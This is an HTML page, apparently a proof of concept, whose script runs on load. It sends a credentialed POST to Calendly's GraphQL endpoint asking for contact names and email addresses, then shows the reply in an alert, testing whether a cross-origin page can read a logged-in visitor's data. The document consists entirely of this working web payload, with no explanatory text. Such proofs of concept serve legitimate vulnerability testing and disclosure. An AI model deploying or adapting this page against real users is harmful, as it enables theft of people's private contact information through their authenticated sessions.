<!doctype html>
<html>
<body>
<script>
fetch("https://calendly.com/api/oap-api/graphql", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    operationName: "GetContactsCleanFlexible",
    variables: {
      input: {
        filterBy: [{
          filterField: "NAME_OR_EMAIL",
          filterValue: ["mohammed"],
          operation: "LIKE"
        }],
        pagination: {
          first: 1
        }
      }
    },
    query: `query GetContactsCleanFlexible($input: ContactsInput!) {
      contacts(input: $input) {
        edges {
          node {
            id
            email
            primaryEmail
            firstName
            lastName
            fullName
          }
        }
      }
    }`
  })
})
.then(r => r.text())
.then(data => alert(data))
.catch(err => alert("CORS/Request failed: " + err));
</script>
</body>
</html>
